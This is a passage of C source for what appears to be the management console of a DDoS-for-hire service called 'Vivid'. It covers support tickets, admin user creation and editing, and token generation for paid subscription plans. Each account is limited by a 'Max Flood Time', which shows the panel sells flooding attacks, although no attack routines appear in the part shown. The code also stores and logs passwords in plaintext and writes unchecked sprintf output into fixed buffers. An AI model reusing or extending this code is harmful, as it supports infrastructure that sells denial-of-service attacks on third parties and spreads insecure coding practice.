                    sprintf(vivid, "\r\n\t    "Y"*Do Not Respond Unless Authorized!*\r\n\tWould You Like To Reply To This Ticket?(y/n): ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "Y") || !strcmp(buf, "y")){
                        //Reply To Ticket
                        char tktresp[500];
                        getresponse:
                        sprintf(vivid, "\r\n"Y"["CY"Response"Y"]"CY": ");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        if(fdgets(tktresp, sizeof tktresp, vivfd) < 1) goto end;
                        Trim(tktresp);
                        if(strlen(tktresp) < 3){
                            sprintf(vivid, ""R"Response Is Too Short"CR"");
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                            memset(tktresp, 0, sizeof(tktresp));
                            goto getresponse;
                        }
                        time_t t = time(NULL);
                        struct tm tm = *localtime(&t);
                        FILE *resptkf = fopen(tkttoview, "a");
                        fprintf(resptkf, "\n\n"Y"["CY"%d/%d/%d %d:%d:%d"Y"]\n"CY"Response From:"Y"%s\n"CY"RE:"Y"%s\n"CY"Response:"Y"%s\n"CY"Status: "Y"CLOSED"CR"\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, MNGRS[vivfd].nick, adtktview, tktresp);
                        fclose(resptkf);
                        Split_Str(tktarg);
                        // Path to old and new files
                        char oldName[0x100], newName[0x100];
                        snprintf(oldName, sizeof(oldName), "%s", tkttoview);
                        snprintf(newName, sizeof(newName), ""LFD"/SupportTickets/HELP/CLOSED-%s-%s", adtktview, split_argv[2]);
                        if(rename(oldName, newName) == 0){
                            sprintf(vivid, "\r\n\t"CY"["Y"%s"CY"] "Y"Replied To Ticket "CY"["Y"%s"CY"]"CR"\r\n", MNGRS[vivfd].nick, adtktview);
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        }
                        else{
                            sprintf(vivid, "\r\n"R"Couldn't Rename Ticket, Please Contact An Owner!"CR"\r\n");
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        }
                        memset(tkttoview, 0, sizeof(tkttoview));
                        memset(adtktview, 0, sizeof(adtktview));
                        memset(tktresp, 0, sizeof(tktresp));
                        memset(oldName, 0, sizeof(oldName));
                        memset(newName, 0, sizeof(newName));
                        aftrepwt:
                        sprintf(vivid, "\r\n"CR"« B.Go Back\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t"CY"╚═» ");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                        Trim(buf);
                        if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto helpcenter;
                        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                        else{
                            sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                            memset(buf, 0, sizeof(buf));
                            sleep(1);
                            goto aftrepwt;
                        }
                    }
                    else{
                        memset(tkttoview, 0, sizeof(tkttoview));
                        memset(buf, 0, sizeof(buf));
                        goto helpcenter;
                    }
                }
                else{
                    char rgtktview[500];
                    rgwaitforticket:
                    sprintf(vivid, ""Y"["CY"Ticket ID# To View("Y"Ex: 5045"CY")"Y"]"CY": ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(vivid, 0, sizeof(vivid));
                    if(fdgets(rgtktview, sizeof rgtktview, vivfd) < 1) goto end;
                    Trim(rgtktview);
                    //printf("User Is Viewing Ticket %s\n", rgtktview);
                    char tktarg[100];
                    DIR *dr = opendir(""LFD"/SupportTickets/HELP/"); 
                    while ((de = readdir(dr)) != NULL){ 
                        if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, "..")){
                            //Do Nothing, Straight Logic
                        }
                        else{
                            if(strstr(de->d_name, MNGRS[vivfd].nick)){
                                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                                sprintf(tktarg, "%s", de->d_name);
                            }
                        }
                    }
                    char tkttoview[0x500];
                    snprintf(tkttoview, sizeof(tkttoview), ""LFD"/SupportTickets/HELP/%s", tktarg);
                    FILE *stream;
                    char *line = NULL;
                    size_t len = 0;
                    ssize_t read;
                    stream = fopen(tkttoview, "r");
                    if(stream == NULL){
                        sprintf(vivid, ""R"That Ticket Doesn't Exist..."CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(tkttoview, 0, sizeof(tkttoview));
                        memset(rgtktview, 0, sizeof(rgtktview));
                        goto rgwaitforticket;
                    }
                    if(send(vivfd, "\r\n\r\n"Y"", strlen("\r\n\r\n"Y""), MSG_NOSIGNAL) == -1) goto end;
                    while((read = getline(&line, &len, stream)) != -1) {
                        sprintf(vivid, "%s\r", line);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    }
                    free(line);
                    fclose(stream);

                    aftrvwwt:
                    sprintf(vivid, "\r\n"CR"« B.Go Back\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t"CY"╚═» ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto helpcenter;
                    else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                    else{
                        sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        sleep(1);
                        goto aftrvwwt;
                    }
                }
            } 
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto helpcenter;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else{
                sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sleep(1);
                goto shwhlptkts;
            } 
        }
        else if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto homescreen;
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
        else{
            sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            memset(buf, 0, sizeof(buf));
            sleep(1);
            goto helpcenter;
        }

        adminhub:
        if(send(vivfd, adhb, strlen(adhb), MSG_NOSIGNAL) == -1) goto end;
        sprintf(vivid, "\r\n"CR"« B.Go Back\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t\t"CY"╚═» ");
        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
        Trim(buf);
        if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto homescreen;
        else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
        else if(!strcmp(buf, "1")){ //Add/Edit
            adby:
            memset(buf, 0, sizeof(buf));
            sprintf(vivid, "                        "CY"╔══════════════════╗\r\n                        ║ 1."Y"Add User/Token "CY"║\r\n                        ╚══════════════════╝\r\n                        ╔═══════════════════════╗\r\n                        ║ 2."Y"Edit A User Account "CY"║\r\n                        ╚═══════════════════════╝\r\n");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            sprintf(vivid, "\r\n"CR"« B.Go Back\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t\t"CY"╚═» ");
            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
            if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
            Trim(buf);
            if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
            else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
            else if(!strcmp(buf, "1")){ //Add User/Token
                addeditwt:
                sprintf(vivid, "                        "CY"╔══════════════╗\r\n                        ║ 1."Y"Add A User "CY"║\r\n                        ╚══════════════╝\r\n                        ╔════════════════════╗\r\n                        ║ 2."Y"Generate A Token "CY"║\r\n                        ╚════════════════════╝\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                sprintf(vivid, "\r\n"CR"« B.Go Back\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t\t"CY"╚═» ");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                Trim(buf);
                if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                else if(!strcmp(buf, "1")){ //AddUser
                    int ret, kdm, new_secs, new_spfsecs, new_cldwn;
                    char new_user[40], new_pass[40], new_type[20], new_expr[20], new_seconds[10], new_spfplan[10], new_spf_seconds[10], new_mltf[10];
                    readduser:
                    memset(new_user, 0, sizeof(new_user));
                    if(send(vivfd, ""Y"[Username]"CY": "W"", strlen(""Y"[Username]"CY": "W""), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(new_user, sizeof new_user, vivfd) < 1) goto end;
                    Trim(new_user);
                    if(strlen(new_user) < 3) goto readduser;
                    for(kdm = 0; kdm < MXFDS; kdm++){
                        if(strstr(ACCS[kdm].vivu, new_user)){
                            sprintf(vivid, ""R"The Username "CY"%s is Already Taken..."W"\r\n", new_user);
                            if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                            goto readduser;
                        }
                    }
                    sleep(0.5);
                    if(send(vivfd, ""Y"[Password]"CY": "W"", strlen(""Y"[Password]"CY": "W""), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(new_pass, sizeof new_pass, vivfd) < 1) goto end;
                    Trim(new_pass);
                    sleep(0.5);
                    stswt:
                    memset(new_type, 0, sizeof(new_type));
                    if(send(vivfd, ""Y"[Status('reg'/'admin')]"CY": "W"", strlen(""Y"[Status('reg'/'admin')]"CY": "W""), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(new_type, sizeof new_type, vivfd) < 1) goto end;
                    Trim(new_type);
                    if(!strcmp(new_type, "reg") || !strcmp(new_type, "admin")){
                        //Do Nothing, Straight Logic
                    }
                    else goto stswt;
                    sleep(0.5);
                    if(send(vivfd, ""Y"[Expiration]-[DD/MM/YYYY Ex: '31/12/2019']"CY": "W"", strlen(""Y"[Expiration]-[DD/MM/YYYY Ex: '31/12/2019']"CY": "W""), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(new_expr, sizeof new_expr, vivfd) < 1) goto end;
                    Trim(new_expr);
                    sleep(0.5);
                    if(send(vivfd, ""Y"[Max Flood Time(In Seconds)]"CY": "W"", strlen(""Y"[Max Flood Time(In Seconds)]"CY": "W""), MSG_NOSIGNAL) == -1) goto end;
                    if(new_secs) new_secs = 0;
                    if(fdgets(new_seconds, sizeof new_seconds, vivfd) < 1) goto end;
                    Trim(new_seconds);
                    new_secs = atoi(new_seconds);
                    sleep(0.5);
                    FILE *uinfo = fopen(DB, "a+");
                    fprintf(uinfo, "%s %s %s %s %d\n", new_user, new_pass, new_type, new_expr, new_secs);
                    fclose(uinfo);
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Added User [%s]\n", MNGRS[vivfd].nick, new_user);
                    fclose(adinfo);
                    printf(""CY"%s "Y"Added User ["G"%s"Y"]\n", MNGRS[vivfd].nick, new_user);
                    sprintf(vivid, "\t\t"CY"Added User ["Y"%s"CY"]"CR"", new_user);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    aduwt:
                    sprintf(vivid, "\r\n"CR"« B.Go Back\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t\t"CY"╚═» ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                    else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                    else{
                        sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        sleep(1);
                        goto aduwt;
                    }
                }
                else if(!strcmp(buf, "2")){ //Gen Token
                    char *new_token;
                    int amt, token_amt, msecs, mspfsecs;
                    char tokens[50];
                    char expire[10];
                    char maxsecs[10];
                    char spfpln[10];
                    char maxspfsecs[10];
                    char new_mltf[10];
                    if(send(vivfd, "\r\n"Y"[How Many Tokens?]"CY": "W"", strlen(""Y"[How Many Tokens?]"CY": "W""), MSG_NOSIGNAL) == -1) goto end;
                    memset(tokens, 0, sizeof(tokens));
                    if(fdgets(tokens, sizeof tokens, vivfd) < 1) goto end;
                    Trim(tokens);
                    token_amt = atoi(tokens);
                    sleep(0.3);
                    tknexpwt:
                    if(send(vivfd, ""Y"[Plan(1WEEK/1MONTH/3MONTHS/6MONTHS/1YEAR)]"CY": "W"", strlen(""Y"[Plan(1WEEK/1MONTH/3MONTHS/6MONTHS/1YEAR)]"CY": "W""), MSG_NOSIGNAL) == -1) goto end;
                    memset(expire, 0, sizeof(expire));
                    if(fdgets(expire, sizeof expire, vivfd) < 1) goto end;
                    Trim(expire);
                    if(!strcmp(expire, "1day") || !strcmp(expire, "1DAY") || !strcmp(expire, "1week") || !strcmp(expire, "1WEEK") ||  !strcmp(expire, "1month") || !strcmp(expire, "1MONTH") || !strcmp(expire, "3months") || !strcmp(expire, "3MONTHS") || !strcmp(expire, "6months") || !strcmp(expire, "6MONTHS") || !strcmp(expire, "1year") || !strcmp(expire, "1YEAR")){
                        //Do Nothing, Straight Logic
                    }
                    else{
                        sprintf(vivid, ""R"INVALID EXPIRY - Enter: '1WEEK'/1MONTH'/'3MONTHS'/'6MONTHS'/'1YEAR'"CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        goto tknexpwt;
                    }
                    sleep(0.3);
                    if(send(vivfd, ""Y"[Max Flood Time(In Seconds)]"CY": "W"", strlen(""Y"[Max Flood Time(In Seconds)]"CY": "W""), MSG_NOSIGNAL) == -1) goto end;
                    memset(maxsecs, 0, sizeof(maxsecs));
                    if(fdgets(maxsecs, sizeof maxsecs, vivfd) < 1) goto end;
                    Trim(maxsecs);
                    msecs = atoi(maxsecs);
                    sleep(0.3);
                    FILE *toks;
                    toks = fopen(TKNS, "a+");
                    redo_toks:
                    if(toks == NULL){
                        fclose(toks);
                        toks = fopen(TKNS, "w");
                        goto redo_toks;
                    }
                    for(amt = 0; amt < token_amt; amt++){
                        new_token = MakeString();
                        fprintf(toks, "%s reg %s %d %s\n", new_token, expire, msecs, MNGRS[vivfd].nick);
                        printf(""CY"%s "Y"Generated Token ["G"%s"Y"]\n", MNGRS[vivfd].nick, new_token);
                        sprintf(vivid, ""Y"Added Token \x1b[0m("Y"%s\x1b[0m) "CY"%d\x1b[0m/"CY"%d!\x1b[0m\r\n", new_token, amt+1, token_amt);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                        fprintf(adinfo, "[%s] Generated Token [%s]\n", MNGRS[vivfd].nick, new_token);
                        fclose(adinfo);
                    }
                    fclose(toks);
                    gntkwt:
                    sprintf(vivid, ""CR"\r\n« B.Go Back\r\n« L.Log Out\r\n\t\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n\t\t\t\t╚═» ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                    else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                    else{
                        sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        sleep(1);
                        goto gntkwt;
                    }
                }
                else{
                    sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    sleep(1);
                    goto addeditwt;
                }
            }
            else if(!strcmp(buf, "2")){//Edit User
                char user2update[20];
                char userprofile[20];
                char usercurrdate[20];
                char update[20];
                char new_update_time[20];
                getuser2update:
                sprintf(vivid, "\r\n\t\t    "Y"[User To Update]"CY": ");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                Trim(buf);
                if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                sprintf(user2update, "%s", buf);
                FILE *fp;
                char temp[1024];
                if((fp = fopen(DB, "r")) == NULL){
                    printf(""Y"FIX THE EDIT USER FUNC"CR"\n");
                    sleep(2);
                    goto adminhub;
                }
                int founduser = 0;
                while(fgets(temp, 1024, fp) != NULL){
                    if((strstr(temp, user2update)) != NULL){
                        founduser = 1;
                        sprintf(userprofile, "%s", temp);
                    }
                }
                if(fp)
                    fclose(fp);
                if(founduser != 1){
                    sprintf(vivid, "\t\t"R"Couldn't Find That User...\r\n");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(user2update, 0, sizeof(user2update));
                    goto getuser2update;
                }
                int split_uargc = 0;
                char *split_uargv[MXPRMS + 1] = { 0 };
                int i = 0;
                for (i = 0; i < split_uargc; i++)
                    split_uargv[i] = NULL;
                split_uargc = 0;
                char *token = strtok(userprofile, " ");
                while (token != NULL && split_uargc < MXPRMS){
                    split_uargv[split_uargc++] = malloc(strlen(token) + 1);
                    strcpy(split_uargv[split_uargc - 1], token);
                    token = strtok(NULL, " ");
                }
                sprintf(vivid, "                    "CY"╔═════════════════╗r\n                    ║ 1."Y"Edit Username "CY"║\r\n                    ╚═════════════════╝\r\n                    ╔═════════════════╗\r\n                    ║ 2."Y"Edit Password "CY"║\r\n                    ╚═════════════════╝\r\n                    ╔═════════════════╗\r\n                    ║ 3."Y"Add Plan Time "CY"║\r\n                    ╚═════════════════╝\r\n                    ╔═══════════════════════╗\r\n                    ║ 4."Y"Edit Raw Flood Time "CY"║\r\n                    ╚═══════════════════════╝\r\n");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                sprintf(vivid, "\r\n"CR"« B.Go Back\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t\t"CY"╚═» ");
                if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                memset(buf, 0, sizeof(buf));
                if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                Trim(buf);
                if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;                
                else if(!strcmp(buf, "1")){
                    //Edit Username
                    char edit_username[20];
                    getedituser:
                    memset(edit_username, 0, sizeof(edit_username));
                    sprintf(vivid, "\t\t"Y"[New Username]"CY": ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(edit_username, sizeof edit_username, vivfd) < 1) goto end;
                    Trim(edit_username);
                    if(strlen(edit_username) < 3){
                        sprintf(vivid, "\t\t"R"Username Must Be 3+ Chars!"CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        goto getedituser;
                    }
                    iseduok:
                    sprintf(vivid, "\r\n\t\t"Y"New Username Will Be: %s\r\n\t\tIs This Okay?(y/n): ", edit_username);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "y") || !strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "Y")){
                        //Do Nothing, Straight Logic
                    }
                    else if(!strcmp(buf, "n") || !strcmp(buf, "N") || !strcmp(buf, "no") || !strcmp(buf, "NO")) goto getedituser;
                    else goto iseduok;
                    //Remove String
                    char rmold[10];
                    sprintf(rmold, "%s", split_uargv[0]);
                    RMSTR(rmold, DB);
                    FILE *uinfo = fopen(DB, "a+");
                    fprintf(uinfo, "%s %s %s %s %s\n", edit_username, split_uargv[1], split_uargv[2], split_uargv[3], split_uargv[4]);
                    fclose(uinfo);
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Edited Username [%s-%s]\n", MNGRS[vivfd].nick, split_uargv[0], edit_username);
                    fclose(adinfo);
                    printf(""CY"%s "Y"Edited Username [%s-%s]\n", MNGRS[vivfd].nick, split_uargv[0], edit_username);
                    sprintf(vivid, "\t\t"CY"[%s] Edited Username [%s-%s]\n", MNGRS[vivfd].nick, split_uargv[0], edit_username);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    FILE *tempFile;
                    FILE *srcFile = fopen(DB, "r");
                    tempFile = fopen(""LFD"/remove-blanks.tmp", "a+");
                    /* Exit if file not opened successfully */
                    if (srcFile == NULL || tempFile == NULL){
                        goto adminhub;
                    }
                    // Remove empty lines from file.
                    removeEmptyLines(srcFile, tempFile);
                    /* Close all open files */
                    fclose(srcFile);
                    fclose(tempFile);

                    /* Delete src file and rename temp file as src */
                    remove(DB);
                    char oldName[100], newName[100];
                    sprintf(oldName, ""LFD"/remove-blanks.tmp");
                    sprintf(newName, ""DB"");
                    if(rename(oldName, newName) == 0){
                        //Do Nothing, Straight Logic
                    }
                    else{
                        sprintf(vivid, "\r\n"R"Couldn't Rename DB, Please Contact An Owner!"CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    }
                    edtuwt:
                    sprintf(vivid, "\r\n"CR"« B.Go Back\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t\t"CY"╚═» ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                    else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                    else{
                        sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        sleep(1);
                        goto edtuwt;
                    }
                }
                else if(!strcmp(buf, "2")){
                    //Edit Pass
                    sprintf(vivid, "\r\n\t\t"Y"%s's Current Password - %s"CR"\r\n\r\n", split_uargv[0], split_uargv[1]);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    char edit_pass[20];
                    geteditpass:
                    memset(edit_pass, 0, sizeof(edit_pass));
                    sprintf(vivid, "\t\t"Y"[New Password]"CY": ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    if(fdgets(edit_pass, sizeof edit_pass, vivfd) < 1) goto end;
                    Trim(edit_pass);
                    if(strlen(edit_pass) < 3){
                        sprintf(vivid, "\t\t"R"Password Must Be 3+ Chars!"CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        goto geteditpass;
                    }
                    isedpasok:
                    sprintf(vivid, "\r\n\t\t"Y"New Password Will Be: %s\r\n\t\tIs This Okay?(y/n): ", edit_pass);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "y") || !strcmp(buf, "Y") || !strcmp(buf, "y") || !strcmp(buf, "Y")){
                        //Do Nothing, Straight Logic
                    }
                    else if(!strcmp(buf, "n") || !strcmp(buf, "N") || !strcmp(buf, "no") || !strcmp(buf, "NO")) goto getedituser;
                    else goto isedpasok;
                    //Remove String
                    char rmold[10];
                    sprintf(rmold, "%s", split_uargv[0]);
                    RMSTR(rmold, DB);
                    FILE *uinfo = fopen(DB, "a+");
                    fprintf(uinfo, "%s %s %s %s %s\n", split_uargv[0], edit_pass, split_uargv[2], split_uargv[3], split_uargv[4]);
                    fclose(uinfo);
                    FILE *adinfo = fopen(""LFD"/ADMIN_REPORT.log", "a+");
                    fprintf(adinfo, "[%s] Edited Password For %s [%s]\n", MNGRS[vivfd].nick, split_uargv[0], edit_pass);
                    fclose(adinfo);
                    printf(""CY"["Y"%s"CY"] "Y"Edited Password For %s "CY"["Y"%s"CY"]"CR"\n", MNGRS[vivfd].nick, split_uargv[0], edit_pass);
                    sprintf(vivid, "\t\t"CY"[%s] Edited Password For %s [%s]\n", MNGRS[vivfd].nick, split_uargv[0], edit_pass);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    FILE *tempFile;
                    FILE *srcFile = fopen(DB, "r");
                    tempFile = fopen(""LFD"/remove-blanks.tmp", "a+");
                    /* Exit if file not opened successfully */
                    if (srcFile == NULL || tempFile == NULL){
                        goto adminhub;
                    }
                    // Remove empty lines from file.
                    removeEmptyLines(srcFile, tempFile);
                    /* Close all open files */
                    fclose(srcFile);
                    fclose(tempFile);

                    /* Delete src file and rename temp file as src */
                    remove(DB);
                    char oldName[100], newName[100];
                    sprintf(oldName, ""LFD"/remove-blanks.tmp");
                    sprintf(newName, ""DB"");
                    if(rename(oldName, newName) == 0){
                        //Do Nothing, Straight Logic
                    }
                    else{
                        sprintf(vivid, "\r\n"R"Couldn't Rename DB, Please Contact An Owner!"CR"\r\n");
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    }
                    edtpwt:
                    sprintf(vivid, "\r\n"CR"« B.Go Back\t\t\t"CY"╔══╣"UND"Vivid"NUND"║\r\n"CR"« L.Log Out\t\t\t"CY"╚═» ");
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    memset(buf, 0, sizeof(buf));
                    if(fdgets(buf, sizeof buf, vivfd) < 1) goto end;
                    Trim(buf);
                    if(!strcmp(buf, "B") || !strcmp(buf, "b")) goto adminhub;
                    else if(!strcmp(buf, "L") || !strcmp(buf, "l")) goto goodbye;
                    else{
                        sprintf(vivid, "\r\n\t\t"R"'%s' Is Not A Valid Input!\r\n", buf);
                        if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                        memset(buf, 0, sizeof(buf));
                        sleep(1);
                        goto edtpwt;
                    }
                }
                else if(!strcmp(buf, "3")){//Add Plan Time
                    sprintf(vivid, "\r\n\t\t"Y"%s's Current Expiry - %s"CR"\r\n\r\n", split_uargv[0], split_uargv[3]);
                    if(send(vivfd, vivid, strlen(vivid), MSG_NOSIGNAL) == -1) goto end;
                    sprintf(usercurrdate, "%s", split_uargv[3]);
                    Trim(usercurrdate);
                    int split_nuargc = 0;
                    char *split_nuargv[MXPRMS + 1] = { 0 };
                    int iii = 0;
                    for (iii = 0; iii < split_nuargc; iii++)
                        split_nuargv[iii] = NULL;
                    split_nuargc = 0;
                    char *ttoken = strtok(usercurrdate, "/");
                    while (ttoken != NULL && split_nuargc < MXPRMS){
                        split_nuargv[split_nuargc++] = malloc(strlen(ttoken) + 1);
                        strcpy(split_nuargv[split_nuargc - 1], ttoken);
                        ttoken = strtok(NULL, "/");
                    }
                    char cuday[10];
                    char cumnth[10];
                    char cuyear[10];
                    sprintf(cuday, "%s", split_nuargv[0]);
                    sprintf(cumnth, "%s", split_nuargv[1]);
                    sprintf(cuyear, "%s", split_nuargv[2]);
                    addtmwt:
                    memset(update, 0, sizeof(update));
                    sprintf(vivid, "\t"Y"[Time To Add(1DAY/1WEEK/1MONTH/3MONTHS/6MONTHS/1YEAR)]"CY": ");
